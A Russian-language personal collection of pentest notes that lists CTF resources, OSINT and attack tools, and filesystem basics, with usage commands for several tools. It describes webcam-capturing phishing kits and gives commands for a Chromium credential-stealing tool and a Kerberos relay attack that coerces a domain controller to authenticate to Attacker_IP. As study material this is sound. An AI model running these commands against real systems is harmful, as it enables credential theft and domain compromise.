# Links

# Cybersecurity & Pentest Knowledge Base

## 📚 Оглавление

* [CTF и обучение](#ctf-и-обучение)
* [OSINT и разведка](#osint-и-разведка)
* [Веб-безопасность и сканеры](#веб-безопасность-и-сканеры)
* [Эксплуатация и постэксплуатация](#эксплуатация-и-постэксплуатация)
* [Active Directory и Windows](#active-directory-и-windows)
* [Форензика и DFIR](#форензика-и-dfir)
* [Реверс-инжиниринг и malware](#реверс-инжиниринг-и-malware)
* [Инструменты и среды](#инструменты-и-среды)
* [Операционные системы](#операционные-системы)
* [VPN и безопасность сети](#vpn-и-безопасность-сети)
* [Бэкапы и операционная гигиена](#бэкапы-и-операционная-гигиена)
* [Полезные статьи и справочники](#полезные-статьи-и-справочники)

---

## CTF и обучение

* CTFtime — соревнования и рейтинги
* Hacker101 — бесплатные курсы по веб-безопасности
* PortSwigger Web Security Academy
* CryptoHack — практика по криптографии
* pwn.college, pwnable.kr
* Crackmes.one — реверс-инжиниринг
* Stepik: курс по кибербезопасности

## OSINT и разведка

* ClatScope — универсальный OSINT
* Ghoulbond — OSINT и сканирование
* DeepFindMe — цифровой след
* Th3inspector — домены и IP
* Amass — сбор внешней поверхности

## Веб-безопасность и сканеры

* Open-source web scanners
* Commix — command injection
* AdminPBuster — поиск админок
* SpiderSuite — web crawler
* Zphisher — фишинг (educational)

## Эксплуатация и постэксплуатация

* Metasploit Framework
* Cobalt Strike / Merlin / Koadic
* Krbrelayx — Kerberos relay
* DCOMUploadExec — lateral movement
* SploitScan — поиск эксплойтов

## Active Directory и Windows

* Escalatoria — повышение привилегий Linux
* JumpServer — PAM
* Chrome App-Bound Encryption bypass
* AMSI Bypass PowerShell

## Форензика и DFIR

* forensictools
* Digler — disk forensics
* PCredz — извлечение кредов из трафика
* Photo Forensics
* Malware Forensics — Info-Savvy

## Реверс-инжиниринг и malware

* Ghidra, GhidraGPT
* Cutter (rizin)
* dnSpy
* Malware-collection
* Vmware-exploitation

## Инструменты и среды

* Kali Linux
* Burp Suite
* Wireshark
* Docker / Docker Compose
* VirtualBox
* Ghidra
* VirusTotal

## Операционные системы

### Windows

* C:/Windows — системные файлы
* Program Files / (x86)
* Users
* Temp и PerfLogs

### Linux

* /bin, /sbin
* /etc
* /home, /root
* /proc, /sys
* /var, /tmp

## VPN и безопасность сети

* WireGuard
* Mullvad / Proton / IVPN
* Kill Switch
* HTTPS-Only
* 2FA

## Бэкапы и операционная гигиена

* Правило 3-2-1
* BorgBackup
* Rsync + cold storage
* Регулярное тестирование восстановления

## Полезные статьи и справочники

* Pentest-Wiki
* PayloadsAllTheThings (XXE)
* Чемоданчик пентестера (Habr)
* Linux Commands Cheat Sheet
* Kali Linux Docs

---

*Документ структурирован для удобной навигации. Все разделы доступны через оглавление.*




Metasploit? Руководство для начинающих
https://habr.com/ru/companies/varonis/articles/528578/
https://docs.metasploit.com/docs/using-metasploit/index.html




https://ctftime.org/

GitHub - Hacker0x01/hacker101: Source code for Hacker101.com - a free online web and mobile security class.
https://github.com/Hacker0x01/hacker101

Symbiote — это инструмент социальной инженерии, предназначенный для создания фишинг-страницы и захвата изображений с веб-камеры. 
https://github.com/hasanfirnas/symbiote
Запрашивая разрешение камеры на устройстве жертвы, этот скрипт может делать снимки скрытно.

https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
Amsi-Bypass-Powershell — этот репозиторий содержит несколько методов обхода / предотвращения сканирования антивирусным ПО (AMSI)

https://github.com/mishakorzik/Free-Proxy
Free-Proxy — предоставляет обширный список прокси-серверов для различных задач.

https://github.com/cristianzsh/forensictools
Forensictools — это набор инструментов, разработанный для цифровой криминалистики и предлагающий широкий спектр возможностей. 

Его основная цель — упростить создание виртуальной среды для проведения криминалистических экспертиз.

https://github.com/mschwartz/assembly-tutorial
Assembly-tutorial — учебное руководство по программированию на ассемблере для архитектуры AMD64/Intel 64.

https://github.com/hasanfirnas/symbiote
Symbiote — это инструмент социальной инженерии, предназначенный для создания фишинг-страницы и захвата изображений с веб-камеры. 

Запрашивая разрешение камеры на устройстве жертвы, этот скрипт может делать снимки скрытно.

https://github.com/Clats97/ClatScope
ClatScope Info Tool — универсальная утилита OSINT для получения геолокационных данных, DNS, WHOIS, номеров телефонов, адресов электронной почты, имён пользователей, данных о людях, информации о надёжности паролей, утечке данных и многом другом.

https://github.com/Drew-Alleman/DataSurgeon
DataSurgeon — это универсальный инструмент, предназначенный для реагирования на инциденты, защиты от потери данных, тестирования на проникновение и решения задач CTF. 
Он позволяет извлекать различные типы конфиденциальной информации, включая электронные письма, номера телефонов, хэши, кредитные карты, URL-адреса, IP-адреса, MAC-адреса, записи DNS SRV и многое другое!

https://github.com/shramos/Awesome-Cybersecurity-Datasets
Awesome-Cybersecurity-Datasets — подготовленный список потрясающих наборов данных по кибербезопасности.

https://github.com/psiinon/open-source-web-scanners
Open-source-web-scanners — список сканеров веб-безопасности с открытым исходным кодом на GitHub и GitLab, упорядоченный по количеству звёзд.

https://github.com/deepinstinct/DCOMUploadExec
продвинутая техника бокового перемещения для загрузки и выполнения пользовательских полезных нагрузок на удаленных компьютерах.

https://github.com/FlareSolverr/FlareSolverr
 это прокси-сервер для обхода защиты Cloudflare и DDoS-GUARD.

https://github.com/m0rtem/CloudFail
CloudFail — это инструмент для тактической разведки, цель которого — собрать достаточно информации о цели, защищённой Cloudflare, в надежде определить местоположение сервера. 
Используя Tor для маскировки всех запросов, этот инструмент на данный момент состоит из трёх этапов атаки.

https://github.com/t6x/reaver-wps-fork-t6x
 реализует атаку методом перебора на защищённую настройку Wi-Fi (WPS) с использованием PIN-кодов для восстановления паролей WPA/WPA2

https://github.com/hitesh22rana/ghoulbond
Ghoulbond — системная утилита с открытым исходным кодом, сканер и инструмент OSINT.

https://github.com/Buddhsen-tripathi/DeepFindMe
DeepFindMe — это образовательная OSINT-платформа, предлагающая инструменты и ресурсы, которые помогают пользователям понять свой цифровой след и управлять им.

https://github.com/owasp-amass/amass
выполняет анализ сети на предмет уязвимостей и внешних ресурсов с помощью сбора информации из открытых источников и методов активной разведки.

https://github.com/htr-tech/zphisher
Zphisher — автоматизированный инструмент для фишинга с более чем 30 шаблонами.

Этот инструмент создан исключительно в образовательных целях!

https://github.com/snoopysecurity/awesome-burp-extensions?ysclid=m8o38xjta7202265980
Awesome-burp-extensions — это удивительный список для тех, кто хочет разнообразить свой экземпляр Burp потрясающими плагинами.

https://github.com/hubert3/iSniff-GPS?ysclid=m8pt9twbgd593343955
iSniff-GPS — инструмент пассивного перехвата для сбора и визуализации данных о местоположении Wi-Fi, раскрываемых устройствами iOS.

https://github.com/espreto/wpsploit
WPSploit — использование WordPress с помощью Metasploit.
Этот репозиторий предназначен для создания и/или переноса конкретных эксплойтов для WordPress с использованием metasploit в качестве инструмента для эксплуатации.

https://github.com/cc1a2b/jshunter
Jshunter — это инструмент командной строки, предназначенный для анализа файлов JavaScript и извлечения конечных точек. 
Этот инструмент специализируется на выявлении конфиденциальных данных, таких как конечные точки API и потенциальные уязвимости в системе безопасности, что делает его важным ресурсом для разработчиков, специалистов по поиску уязвимостей и исследователей в области безопасности.

https://github.com/thefLink/Hunt-Sleeping-Beacons
Hunt-Sleeping-Beacons — сканер, который пытается идентифицировать индикаторы компрометации (IOC), указывающие на наличие C2 агентов.

https://github.com/commixproject/commix

https://pakhrom.nekoweb.org/resources/cybersec/

https://github.com/EbookFoundation/free-programming-books

https://github.com/mandiant/flare-vm
набор сценариев установки программного обеспечения для систем Windows, который позволяет легко настроить и поддерживать среду для реверс-инжиниринга на виртуальной машине.

https://github.com/ostafen/digler
Digler — это инструмент для криминалистического анализа дисков и восстановления файлов. 
Он предназначен для поиска потерянных или удалённых данных на различных образах дисков и необработанных устройствах.

https://github.com/usestrix/strix
Strix — это автономные ИИ-агенты, которые действуют как настоящие хакеры: они динамически запускают ваш код, находят уязвимости и проверяют их с помощью реальной эксплуатации. 
Они созданы для разработчиков и специалистов по безопасности, которым нужно быстрое и точное тестирование безопасности без необходимости проводить пентест вручную или сталкиваться с ложными срабатываниями инструментов статического анализа.

https://stepik.org/course/%D0%9A%D0%B8%D0%B1%D0%B5%D1%80%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE%D1%81%D1%82%D1%8C-94299/

GitHub - GeenStack/Escalatoria: Большое практическое руководство по повышению привилегий в Linux
https://github.com/GeenStack/Escalatoria?ysclid=mhl2lfzt7m727736985

https://t.me/CyberSachok/2750

WEB: https://www.youtube.com/watch?v=MFYKmPESSO4&list=PLLguubeCGWoaGFEDzduGmBhEgZ62p-Jqv
https://www.youtube.com/watch?v=aP_CsSV57Nk&t=1s
https://www.youtube.com/live/mU0hu_hvinM?si=kgQg9HLFT-fKzAYw
https://www.youtube.com/live/IQTJOxzhOWk?si=kgQc8yXpN_hoYQVs
https://www.youtube.com/live/-SbBD7RRSEM?si=rQV4vOtA0E-g4cEw
https://www.youtube.com/live/_sL1ZeSnywU?si=usL2QaqMXxsA2z_W
https://www.youtube.com/live/u0fA4IS4oK4?si=vP6ZEBPeVb0S0GOi
https://www.youtube.com/live/vMYbZ_jZJfk?si=-1-UKuZNb2R7tdiW
https://www.youtube.com/live/lNJLrCi6kPw?si=U1Irc6f-jBQGWvLU
PWN: https://www.youtube.com/watch?v=pNvpCpW6Y_U&list=PLLguubeCGWoY12PWrD-oV3nZg3sjJNKxm
REVERSE: https://www.youtube.com/watch?v=p0u_bsdZCiY&list=PLLguubeCGWoZIZBfJ1ZfJytjHLZyFFrMk
CRYPTO: https://youtu.be/BSYDEq1ky80?si=whN29yt5g4odogid
https://youtu.be/yAkNfGAc_zI?si=0Ac05zxdnRTyRykB
FORENSICS: https://youtu.be/7lNTMNITcSA
https://youtu.be/MnQzJSmtYSo
https://youtu.be/aj68BU-Vs_U
https://youtu.be/WWUX-8SKYiQ

Инструменты:
1. Kali Linux;
2. Burp;
244
3. dnSpy;
4. Wireshark;
5. Virtualbox;
6. Visual Studio Code;
7. Docker, Docker Compose;
8. Mtpass;
9. VirusTotal;
10. Process Hacker;
11. Ghidra.
Материалы для подготовки
1. OWASP. Cross-Site Request Forgery (CSRF): https://owasp.org/www-community/attacks/csrf.
2. Codedokode. Безопасность — материалы репозитория Pasta: https://github.com/codedokode/pasta/tree/master/security.
3. XSS Game — Интерактивное обучение XSS-уязвимостям: https://xss-game.appspot.com/.
4. OWASP. Cross-Site Scripting (XSS): https://owasp.org/www-community/attacks/xss/.
5. OWASP. Testing for Remote File Inclusion: https://wiki.owasp.org/index.php/Testing_for_Remote_File_Inclusion.
6. OWASP Cheat Sheet Series. Cross-Site Request Forgery Prevention Cheat Sheet:https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html.
7. CryptoHack — Образовательная платформа по криптографии: https://cryptohack.org/.
8. OWASP. SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection.
9. HttpDump — Сервис перехвата HTTP-запросов: https://httpdump.app/.
10. Beeceptor — Сервис создания REST API моков: https://beeceptor.com/.
11. Squeamish Ossifrage — Блог по информационной безопасности: https://squeamishossifrage.eu/.
12. PortSwigger Web Security Academy: https://portswigger.net/web-security.
13. Shellphish. how2heap — репозиторий по изучению heap exploitation: https://github.com/shellphish/how2heap.
14. YouTube. Плейлист по информационной безопасности: https://www.youtube.com/watch?v=pNvpCpW6Y_U&list=PLLguubeCGWoY12PWrD-oV3nZg3sjJNKxm.
15. Кибербезопасность КМБ: https://kmb.cybber.ru/about.html.
16. Info-Savvy. What is Malware Forensics?: https://info-savvy.com/what-is-malware-forensics/.
17. BigNerd95. RouterOS Backup Tools — репозиторий GitHub: https://github.com/BigNerd95/RouterOS-Backup-Tools.245
18. Manio's MikroTik password decoder: http://manio.skyboo.net/mikrotik/mtpass-0.9.tar.bz2.
19. Crackmes.one — Платформа для реверс-инжиниринга: https://crackmes.one/.
20. Pwnable.kr — Образовательная платформа по CTF: https://pwnable.kr/.
21. pwn.college — Интерактивное обучение информационной безопасности: https://pwn.college/.
22. МИРеа CTF 365: https://365.mireactf.ru/.
23. МИРеа CTF: https://mireactf.ru/.
24. eLibrary. Научная статья по тематике информационной безопасности: https://www.elibrary.ru/item.asp?edn=vhhwmz.

https://youtu.be/adcijRTI_8E
https://youtu.be/vF145ceiqc4

# Система каталогов Windows
## Диск C:/
Содержит всю файловую систему Windows, но в отличии от Linux,
флешки и другие носители монтируются вне диска C:/.

## Папка Windows
Содержит важные системные файлы.

## Папка Program Files
Содержит 64-разрядные приложения, которые не являются частью ОС.

## Папка Program Files(x86)
Содержит 32-разрядные приложения, которые не являются частью ОС.

## Папка Users
Содержит папки пользователей.

## Папка PerfLogs
Содержит файлы логов системных ошибок и других отчетов.

## Папка Temp
Такие папки есть по пути C:/Windows/, а также по пути
C:/Users/<имя_пользователя/AppData/Local.

Это аналоги папки /tmp в Linux. В них хранятся временные файлы от
различных программ, но зачастую, из-за неправильного закрытия или
аварийного выхода, файлы остаются лежать в этих папках и занимать
место.

VPN
linux - Throne 
🔑 Ваша подписка:
https://sub.towersflowerss.com/NWLArQ3XmqeHL8VJ
* Нажмите на ссылку, чтобы скопировать.
https://telegra.ph/Kak-nastroit-NashVPN-na-Windows-10-15
❓ Напишите ваш вопрос прямо в этот чат, поможем!


# Система каталогов Linux
## Каталог /
Корневой каталог, содержит все остальные каталоги ОС Linux.

## Каталог /bin
В данном каталоге расположены исполняемые файлы (например, cat, ls,
pwd, ping).

## Каталог /boot
В данном каталоге расположены файлы для загрузки системы.

## Каталог /dev
В данном каталоге расположены файлы драйверов.

## Каталог /etc
В данном каталоге расположены конфиги (например, passwd, shadow).

## Каталог /home
В данном каталоге расположены директории пользователей (аналог
папки Users в Windows).

## Каталог /mnt
В данный каталог обычно монтируются (подключаются) внешние
устройства/носители (например, флешки).

## Каталог /opt
В данном каталоге расположены доп. приложения, которые не влияют
на работу ОС. Сюда можно класть различные инструменты для
тестирования.

## Каталог /proc
В данном каталоге расположены файлы, в которых содержится
информация о запущенных процессах и ядре.

## Каталог /root
Данный каталог является домашней директорией суперпользователя

(root).

## Каталог /run
В данном каталоге расположены файлы с состоянием приложений
(например, сокеты или PID-файлы).

## Каталог /sbin
Данный каталог содержит исполняемые файлы, как и в /bin, но они
нужны для суперпользователя.

## Каталог /srv
В данном каталоге расположены файлы, которые предоставляет
сервер (например, FTP, Apache или Nginx).

## Каталог /sys
В данном каталоге расположены файлы с данными о системе.

## Каталог /tmp
В данном каталоге расположены временные файлы, он очищается при
перезагрузке.

## Каталог /usr
В данном каталоге расположены исполяемые файлы, которые
используются именно пользователями, но не системой.

## Каталог /var
Данный каталог предназначен для хранения большого объема файлов.

https://linuxjourney.com/

https://www.kali.org/docs/introduction/download-official-kali-linux-images//

https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption
Инструмент постэксплуатации, демонстрирующий полный обход App-Bound Encryption (ABE) в Chromium. Инструмент запускает легитимный процесс браузера в приостановленном состоянии с последующей скрытной инъекцией полезной нагрузки, чтобы перехватить его идентичность и контекст безопасности. 

Бесфайловый подход позволяет инструменту работать полностью из памяти, обходя перехватчики пользовательских API для расшифровки и эксфильтрации конфиденциальных пользовательских данных (cookies, пароли, платёжная информация) из современных браузеров на основе Chromium.

Последние предварительно скомпилированные двоичные файлы можно найти на странице релизов.

Особенности
Прямые системные вызовы для обхода: обходит пользовательские хуки EDR/AV в стандартных функциях WinAPI, напрямую вызывая функции ядра.

Прямое создание процесса на основе системных вызовов: скрытный метод создания и внедрения процессов. 

Бесфайловая полезная нагрузка в памяти: полезная нагрузка в виде библиотеки DLL никогда не обращается к диску на целевом компьютере. 

Reflective DLL Injection (RDI): скрытый метод внедрения в процесс, который обходит LoadLibrary, тем самым избегая обнаружения механизмами, отслеживающими загрузку модулей. 

Вызов COM-объекта в целевом контексте: ключевой элемент для обхода шифрования на уровне приложения. 

Не требует прав администратора: работает полностью в рамках контекста безопасности пользователя

Поддерживаемые и протестированные версии
Google Chrome - 142.0.7444.60
Brave - 1.84.132 (142.0.7444.60)
Microsoft Edge - 142.0.3595.53

Использование 

PowerShell


.\chromelevator.exe all
.\chromelevator.exe chrome -v -f


Возможные флаги
 --output-path|-o  —   базовый каталог для выходных файлов;
 --verbose|-v — расширенный вывод отладки;
 --fingerprint|-f — извлечение полных данных для идентификации браузера, включая версию, расширения, настройки безопасности и системную информацию;

Возможные цели
chrome — извлечение данных из Google Chrome
brave — извлечение данных из Brave Browser
edge — извлечение данных из Microsoft Edge
all — извлечение данных из всех установленных браузеров

https://github.com/APTRS/APTRS
APTRS — Automated Penetration Testing Reporting System

    APTRS — это Python/Django-платформа для автоматизации создания отчётов по результатам тестирования на проникновение. Инструмент позволяет формировать PDF- и Excel-отчёты в один клик, полностью исключая рутинное ручное оформление. APTRS также предоставляет удобный механизм для ведения учёта уязвимостей, управления несколькими проектами и централизованного хранения результатов аудита.


 Основные возможности APTRS
 Автоматическая генерация отчётов — формирование PDF и Excel напрямую из веб-интерфейса, без сторонних редакторов и ручного форматирования.
 Ведение нескольких проектов — удобная организация различных тестирований, хранение информации и разделение данных по клиентам.
 Готовые и настраиваемые шаблоны отчётов — единообразный стиль для всех документов + возможность расширения.
 Работа через Docker — быстрое разворачивание окружения без сложной установки зависимостей.
 Интерактивная панель управления — доступ к проектам, уязвимостям и отчётам через удобный веб-интерфейс.

 Установка и запуск

 Установка репозитория:

Bash


git clone https://github.com/APTRS/APTRS
cd APTRS


 Подготовка конфигурационного файла:

Bash


cp env.docker .env


При необходимости можно внести изменения:
nano .env

 Запустите систему:

Bash


docker-compose up

После развертывания интерфейс будет доступен локально 

 Преимущества APTRS
 Существенная экономия времени — отчёты формируются автоматически, что особенно важно при больших объёмах тестирования.
 Минимизация ошибок — единый шаблон и автоматизация исключают неточности и несогласованность в документах.
 Удобное управление проектами и уязвимостями — всё структурировано в одном месте.

https://github.com/jumpserver/jumpserver
JumpServer — это инструмент управления привилегированным доступом (PAM) с открытым исходным кодом, который предоставляет командам DevOps и ИТ-специалистам безопасный доступ по запросу к конечным точкам SSH, RDP, Kubernetes, баз данных и RemoteApp через веб-браузер.

https://telegra.ph/NMAP-v-praktike-pentesta-09-22

https://github.com/MorDavid/BruteForceAI
BruteForceAI — это продвинутый инструмент для тестирования на проникновение, который революционизирует традиционные атаки методом перебора за счёт интеграции больших языковых моделей (LLM) для интеллектуального анализа форм. 

Инструмент автоматически определяет селекторы форм для входа в систему с помощью искусственного интеллекта, а затем выполняет сложные многопоточные атаки с использованием моделей поведения, характерных для человека.

https://github.com/jaykali/Pentest-Handbook

Happy Hunter

Happy Hunter — это скрипт на языке Python, который автоматизирует обнаружение и перечисление баз данных, уязвимых для SQL-инъекций, с помощью sqlmap, облегчая пентестинг и аудит безопасности.

Характеристики:
Автоматически определяет СУБД целевого URL.
Перечисляет доступные базы данных и таблицы.
Простота использования с минимальным количеством аргументов.
Вывод в консоли с цветовой маркировкой для удобства чтения.
Основан на мощности sqlmap.

Установка:

Bash


git clone https://github.com/HackingTeamOficial/HappyHunter.git

Bash


cd HappyHunter


Запуск:

Bash


python3 HappyHunter.py


AdminPBuster

AdminPBuster разработан специально для Red Teams, экспертов по наступательной безопасности и охотников за ошибками, желающих эффективно обнаруживать скрытые или замаскированные панели администратора.
AdminPBuster определяет скрытые панели администратора для любого домена, используя встроенный список слов, включающий как общие, так и неизвестные пути, эффективно обходя WAF.

Характеристики:
Автоматическое обновление путей администратора с GitHub
Корректно обходит перенаправления Cloudflare и WordPress
Реалистичная рандомизация User-Agent с -ua
Многопоточное сканирование (5 потоков по умолчанию, настраиваемое)
Встроенная поддержка SSL/TLS (всегда использует HTTPS + www)

Установка:

Bash


git clone https://github.com/blackhatethicalhacking/AdminPBuster.git

Bash


cd AdminPanelFetcher


Запуск:

Bash


python3 AdminPBuster.py -t example.com

Запуск с user-agent:

Bash


python3 AdminPBuster.py -t example.com -th 10 -ua


Pydictor

Мощный и полезный конструктор хакерских словарей для Bruteforce.
Он не только умеет создавать продвинутые словари паролей, но и предлагает полезные функции по их обработке: объединение, удаление дубликатов, фильтрация и т.д.

Характеристики:
Генерация 7 типов словарей: базовые, с пользовательским набором символов, комбинаторика и др.
8 утилит для работы со словарями: объединение, удаление дубликатов, сравнение, подсчёт частот и пр.
Поддержка 6 специализированных словарей: по дате рождения, ID, FTP-паролям и т.д.
Встроенные методы кодирования и хеширования: base64, md5, sha и др.
Гибкая фильтрация по длине, регуляркам, типам символов и другим критериям

Установка:

Bash


git clone https://github.com/LandGrey/pydictor

Bash


cd pydictor


Использование:
Основной словарь:

Bash


python pydictor.py -base L --len 2 3 --encode b64

Bash


python pydictor.py -base dLc --len 1 3 -o /awesome/pwd


Пользовательский словарь с набором символов:

Bash


python pydictor.py -char "asdf123._@ " --len 1 3 --tail @site.com


 –20% на два курса по промокоду COMBO20 до 19 декабря!

GhostEyes

GhostEyes — это асинхронный, модульный набор инструментов для наступательной разведки, предназначенный для сетевой и веб-разведки, а также для создания отчетов, предназначенный для специалистов по тестированию на проникновение, красных команд и исследователей.

Характеристика:
Сетевая разведка: Сканирование подсети ARP, Обнаружение и выборка VLAN, DHCP-снупинг
Веб-разведка: Брутфорс поддоменов, Брутфорс директорий
Отчеты: Генерация TXT/JSON/HTML/CSV на основе предыдущих сканирований

Установка:

Bash


git clone https://github.com/6lackRaven/GhostEyes.git

Bash


cd GhostEyes


Использование:
Сканирование ARP:

Bash


python ghosteyes.py net -i <INTERFACE> --scan <IP> --output <JSON-FILE>

Поиск VLAN:

Bash


python ghosteyes.py net -i <INTERFACE> --vlan --duration 120

Сканирование поддоменов:

Bash


python ghosteyes.py web -u <DOMAIN> -s <WORDLIST> -T

Krbrelayx: Инструментарий для исследования и эксплуатации Kerberos в Active Directory

    Krbrelayx — это набор инструментов на языке Python, разработанный для демонстрации и проверки уязвимостей, связанных с протоколом Kerberos и службой каталогов Active Directory. Основное внимание уделяется техникам спуфинга и ретрансляции, которые могут позволить злоумышленнику получить несанкционированный доступ или повысить привилегии в корпоративной среде.


Набор Krbrelayx состоит из нескольких инструментов, каждый из которых нацелен на конкретные векторы атаки в инфраструктуре Active Directory:
- Основная функция набора — проведение атак, связанных с ретрансляцией запросов Kerberos, для несанкционированного доступа к сетевым ресурсам
- Инструменты позволяют создавать поддельные службы для перехвата и использования Kerberos-билетов, таких как TGS (Ticket Granting Service)
- Набор демонстрирует эксплуатацию особенностей протокола Kerberos, включая проблемы с проверкой подлинности и делегированием
- Поддержка различных методов указания целей, включая использование файлов и прямых аргументов командной строки

Установка

Bash


sudo apt install krbrelayx


Проверяем 

Bash


krbrelayx -h



Переходим в директорию проекта и устанавливаем зависимости

Bash


cd krbrelayx
pip install -r requirements.txt



Атака с использованием утилиты printerbug и ретрансляции
1. Запуск инструмента ретрансляции на машине атакующего 

Bash


krbrelayx -t ldap://dc02.domain.local # Он будет ожидать входящих соединений Kerberos и ретранслировать их на целевой сервер (например, файловый ресурс)


2. На другой консоли выполняется скрипт printerbug, который принуждает контроллер домена (dc01) 

Bash


printerbug domain.local/dc01\$@dc01.domain.local Attacker_IP # Аутентифицироваться на указанном IP атакующего (Attacker_IP) под учетной записью компьютера dc01$

В результате хэш пароля учетной записи компьютера dc01$ может быть ретранслирован на сервер dc02, что потенциально позволит создать нового пользователя в домене с высокими привилегиями.

Базовая команда для запуска слушателя и ретрансляции на указанный контроллер домена

Bash


krbrelayx -t ldap://dc01.corp.local -wh wpad.corp.local -wa 2

https://github.com/arm/metis.git

Metis — AI-driven инструмент для глубокого анализа безопасности кода

    Metis — инструмент от Arm для анализа безопасности кода. Это open-source решение с ИИ-движком, которое помогает находить скрытые уязвимости, снижать нагрузку на ревьюеров и упрощать разбор сложных или устаревших кодовых баз.


 Основные возможности Metis
 Глубокий security code review — Metis анализирует контекст, логику, зависимости и взаимодействие модулей, находя проблемы, которые часто пропускают линтеры и SAST-решения.
 ИИ-поддержка — встроенные модели помогают выявлять нетривиальные дефекты, подозрочные паттерны и потенциальные цепочки атаки.
 Работа с большими и legacy-проектами — Metis особенно эффективен там, где кодовая база сложная, исторически разросшаяся или плохо документирована.
 Удобный процесс ревью — подсветка рисков, генерация объяснений, рекомендации по исправлению и снижение «усталости ревьюера».
 Автоматизация и гибкость — инструмент можно интегрировать с CI/CD, запускать локально или применять как часть пайплайна безопасной разработки.

 Установка и запуск
Клонирование проекта и установка зависимостей:

Bash


git clone https://github.com/arm/metis.git
cd metis
pip install -r requirements.txt


Запуск анализа:

Bash


python3 metis.py --source /path/to/codebase


Использование в CI/CD:
Metis можно встроить в GitHub Actions, GitLab CI или локальные пайплайны, вызывая тот же CLI.
Пример работы в CI:

Bash


python3 metis.py --source . --output report.json


В репозитории есть примеры конфигураций, моделей и сценариев анализа — изучайте папку 
/examples/ и адаптируйте Metis под свои процессы безопасной разработки.

https://github.com/b30wulf/Malware-collection
Malware-collection — в этом репозитории вы можете найти огромную коллекцию вредоносного программного обеспечения, обнаруженного на GitHub.

https://github.com/xairy/vmware-exploitation
Vmware-exploitation — коллекция ссылок, связанных с эксплойтами VMware escape.

https://github.com/xaitax/SploitScan
SploitScan — это мощный и удобный в использовании инструмент, предназначенный для упрощения процесса выявления эксплойтов для известных уязвимостей и определения вероятности их использования. 

Он позволяет специалистам по кибербезопасности быстро выявлять и применять известные и тестируемые эксплойты.

https://github.com/desaster/kippo
Kippo — это SSH-ловушка среднего уровня взаимодействия, предназначенная для регистрации атак методом перебора и, что самое важное, всего взаимодействия с оболочкой, выполняемого злоумышленником.

https://github.com/Moham3dRiahi/Th3inspector
Th3inspector — инструмент для сбора информации о доменах, IP-адресах и серверах.

https://portswigger.net/web-security/learning-paths/api-testing

https://github.com/lgandx/PCredz
PCredz — автоматический анализатор трафика для извлечение учетных данных

    PCredz — лёгкая, но мощная утилита для извлечения учетных данных, хэшей и другой чувствительной информации из pcap-файлов или живого сетевого трафика. Инструмент активно используют пентестеры, DFIR-аналитики и исследователи сетевой безопасности благодаря удобству, скорости и широкой поддержке протоколов.


 Основные возможности PCredz
 Многопротокольный анализ
Извлечение данных из IPv4 и IPv6 пакетов сразу по множеству протоколов:
  •  NTLMv1/v2 (SMB, HTTP, LDAP, MSSQL и др.)
  •  Kerberos AS-REQ Pre-Auth (etype 23)
  •  HTTP Basic и формы авторизации
  •  FTP, POP, SMTP, IMAP
  •  SNMP community strings
 Поиск кредитных карт в трафике
Определяет и извлекает номера банковских карт, встречающиеся в сетевом потоке.
 Хэши в формате для hashcat
NTLMv1/v2 и Kerberos сохраняются в файлы, которые можно сразу отправлять в hashcat (режимы 5500, 5600, 7500).
 Удобное логирование
Все найденные данные сохраняются в CredentialDump-Session.log и в отдельные файлы (MSKerb.txt, NTLMv1.txt, NTLMv2.txt) в каталоге logs/.

 Установка и запуск
 Docker

Bash


git clone https://github.com/lgandx/PCredz
cd PCredz
docker build . -t pcredz
docker run --net=host -v $(pwd):/opt/Pcredz -it pcredz


 Linux

Bash


apt install python3-pip libpcap-dev file
pip3 install Cython python-libpcap


 Использование
 Разбор pcap-файла

Bash


python3 ./Pcredz -f capture.pcap


 Разбор всех pcap в каталоге

Bash


 python3 ./Pcredz -d /tmp/pcaps/ 


 Живой захват трафика

Bash


 python3 ./Pcredz -i eth0 -v 


 Аргументы запуска
-f <file>  Парсинг pcap-файла
-d <dir>  Рекурсивный разбор каталога
-i <interface>  Живой перехват трафика
-v  Подробный вывод
-o <dir>  Директория для логов

https://29a.ch/photo-forensics/#forensic-magnifier


https://github.com/weirdmachine64/GhidraGPT
GhidraGPT — мощный плагин Ghidra, который интегрирует большие языковые модели (LLM) непосредственно в Ghidra, чтобы улучшить рабочие процессы реверс-инжиниринга за счёт анализа кода и возможностей его улучшения.

Основная функциональность:
1. Перезапись функции: повышение читабельности кода за счёт переименования функций, переменных, вывода типов, обновления прототипов функций и добавления контекстных комментариев, чтобы сделать декомпилированный код более понятным для человека
2. Пояснение к коду: подробное объяснение логики и поведения функции
3. Анализ кода: выявление уязвимостей и анализ безопасности


https://github.com/rizinorg/cutter
Бесплатная настраиваемая платформа для реверс-инжиниринга с открытым исходным кодом. Создана реверс-инженерами для реверс-инженеров. Позволяет анализировать двоичные файлы, создавая высокоуровневое представление машинного кода, содержащегося в них, то есть восстанавливает исходный код, на основе которого был скомпилирован двоичный файл. 

Бинарные файлы Cutter для всех основных платформ (Linux, macOS, Windows) можно загрузить с GitHub Releases. Также можно собрать Cutter из исходного кода:

Bash


git clone --recurse-submodules https://github.com/rizinorg/cutter
cd cutter
sudo apt install build-essential cmake meson pkgconf libzip-dev zlib1g-dev qt6-base-dev qt6-tools-dev qt6-tools-dev-tools libqt6svg6-dev libqt6core5compat6-dev libqt6svgwidgets6 qt6-l10n-tools
mkdir build && cd build
cmake ..
cmake --build .


Cutter поддерживает плагины как на Python, так и на C++. C официальными плагинами и плагинами сообщества можно ознакомиться здесь.  Плагины загружаются из каталога пользовательского уровня, зависящего от операционной системы. Чтобы узнать расположение этого каталога и список загруженных в данный момент плагинов, перейдите в меню Edit -> Preferences -> Plugins. В каталоге плагинов есть два подкаталога: native и python для плагинов на C++ и Python соответственно, которые будут автоматически созданы Cutter.

Параметры командной строки
Инструмент поддерживает как графический интерфейс, так и работу из командной строки.

copy


Cutter [options] [<filename> | –project <project>]

<filename> - Имя файла для открытия. Если не указано, будет показано диалоговое окно выбора файла.

Ниже перечислены некоторые возможные флаги: 
-A, --analysis <level> - при открытии файла автоматически выполняется анализ на заданном уровне (1 из 3 возможных);
-a, --arch <arch> - конкретное название архитектуры;
-b, --bits <bits> - установка определённых бит архитектуры;
-c, --cpu <cpu> - установка конкретного процессора;
